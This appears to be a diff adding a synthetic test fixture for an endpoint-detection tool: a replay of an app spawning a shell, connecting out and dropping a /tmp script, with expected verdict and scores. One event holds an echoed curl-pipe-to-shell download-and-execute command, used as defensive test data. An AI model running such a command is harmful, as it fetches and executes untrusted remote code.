@@ -1,0 +1,105 @@
+{
+  "sample_id": "replay_suspicious_app_shell_egress_02",
+  "group": "suspicious",
+  "summary": "App launches shell; shell reaches external IP and writes /tmp script artifact.",
+  "expected_verdict": "suspicious",
+  "expected_score_range": [48, 62],
+  "expected_top_findings": [
+    "shell_spawn_pattern",
+    "network_egress_to_raw_ip",
+    "tmp_script_drop"
+  ],
+  "events": [
+    {
+      "timestamp": "2026-03-08T10:00:00Z",
+      "category": "processCreated",
+      "processID": 3100,
+      "parentProcessID": 1,
+      "processName": "MediaHelper",
+      "executablePath": "/Applications/MediaHelper.app/Contents/MacOS/MediaHelper",
+      "action": "spawn",
+      "target": "self",
+      "details": "User opened media utility app.",
+      "riskScoreDeltaHint": 2,
+      "rawSource": "synthetic.replay.v1"
+    },
+    {
+      "timestamp": "2026-03-08T10:00:01Z",
+      "category": "processCreated",
+      "processID": 3101,
+      "parentProcessID": 3100,
+      "processName": "bash",
+      "executablePath": "/bin/bash",
+      "action": "spawn",
+      "target": "-c <inline command>",
+      "details": "App spawned shell subprocess for scripted task.",
+      "riskScoreDeltaHint": 12,
+      "rawSource": "synthetic.replay.v1"
+    },
+    {
+      "timestamp": "2026-03-08T10:00:02Z",
+      "category": "scriptExecuted",
+      "processID": 3101,
+      "parentProcessID": 3100,
+      "processName": "bash",
+      "executablePath": "/bin/bash",
+      "action": "runCommandString",
+      "target": "echo 'would run curl https://example.com/test.sh | sh'",
+      "details": "Command text resembles download-exec chain but is replay metadata only.",
+      "riskScoreDeltaHint": 10,
+      "rawSource": "synthetic.replay.v1"
+    },
+    {
+      "timestamp": "2026-03-08T10:00:03Z",
+      "category": "networkConnect",
+      "processID": 3101,
+      "parentProcessID": 3100,
+      "processName": "bash",
+      "executablePath": "/bin/bash",
+      "action": "connect",
+      "target": "198.51.100.23:443",
+      "details": "Outbound TLS connection from shell child process.",
+      "riskScoreDeltaHint": 14,
+      "rawSource": "synthetic.replay.v1"
+    },
+    {
+      "timestamp": "2026-03-08T10:00:04Z",
+      "category": "fileCreated",
+      "processID": 3101,
+      "parentProcessID": 3100,
+      "processName": "bash",
+      "executablePath": "/bin/bash",
+      "action": "create",
+      "target": "/tmp/test_script.sh",
+      "details": "Temporary script artifact written.",
+      "riskScoreDeltaHint": 8,
+      "rawSource": "synthetic.replay.v1"
+    },
+    {
+      "timestamp": "2026-03-08T10:00:05Z",
+      "category": "processExited",
+      "processID": 3101,
+      "parentProcessID": 3100,
+      "processName": "bash",
+      "executablePath": "/bin/bash",
+      "action": "exit",
+      "target": "self",
+      "details": "Shell child exited.",
+      "riskScoreDeltaHint": 0,
+      "rawSource": "synthetic.replay.v1"
+    },
+    {
+      "timestamp": "2026-03-08T10:00:06Z",
+      "category": "processExited",
+      "processID": 3100,
+      "parentProcessID": 1,
+      "processName": "MediaHelper",
+      "executablePath": "/Applications/MediaHelper.app/Contents/MacOS/MediaHelper",
+      "action": "exit",
+      "target": "self",
+      "details": "Application exited.",
+      "riskScoreDeltaHint": 0,
+      "rawSource": "synthetic.replay.v1"
+    }
+  ]
+}
